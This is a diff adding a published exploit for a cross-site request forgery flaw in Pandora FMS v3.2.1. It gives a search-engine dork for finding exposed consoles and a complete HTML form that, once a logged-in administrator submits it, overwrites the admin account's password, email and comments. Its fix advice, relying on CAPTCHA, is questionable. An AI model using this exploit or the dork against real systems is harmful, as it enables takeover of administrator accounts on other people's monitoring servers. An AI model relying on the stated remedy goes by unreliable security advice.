@@ -1,0 +1,33 @@
+# Exploit Title: Pandora FMS v3.2.1 Cross Site Request Forgery
+# Google Dork: intitle:"Pandora FMS - the Flexible Monitoring System" intext:"Your IP"
+# Date: 12-07-2011
+# Author: Mehdi Boukazoula
+# Software Link: http://pandorafms.org/
+# Version: v 3.2.1
+# Tested on: v =< 3.2.1
+# Description : In the page of "http://127.0.0.1/pandora_console/index.php?sec=usuarios&sec2=operation/users/user_edit" we # can submit the parameters : password_new ; password_conf ; phone ; fullname ; e-mail with POST request . We can exploit  # it by sending crafted html page to the administrator (The connected privileged user) with customized values .To patch    # this vulnerability the developpers must integrate an anti-bot system like CAPTCHA in the application .
+--------------------------------------------------------------------------------------------------------
+# Code of exploit (HTML) :
+
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <title>Pandora XSRF exploit
+Click submit</title>
+    </head>
+    <body><form action="http://YOURHOST/pandora_console/index.php?sec=usuarios&sec2=operation/users/user_edit&modified=1&id=admin" method="POST">
+
+<input type="hidden" name="language" value="en_GB" readonly="readonly">
+<input type="hidden" name="uptbutton" value="Update" readonly="readonly">
+<input type="hidden" name="hidden_conf" value="YOUR-hidden" readonly="readonly">
+<input type="hidden" name="hidden_new" value="YOUR-hidden" readonly="readonly">
+<input type="hidden" name="comments" value="ADMIN-CHANGED-FOR-EVER" readonly="readonly">
+<input type="hidden" name="phone" value="PHONE" readonly="readonly">
+<input type="hidden" name="fullname" value="Mehdi Boukazoula" readonly="readonly">
+<input type="hidden" name="email" value="YOUR-EMAIL" readonly="readonly">
+<input type="submit">
+</form>
+</body>
+</html>
+
+# End of code
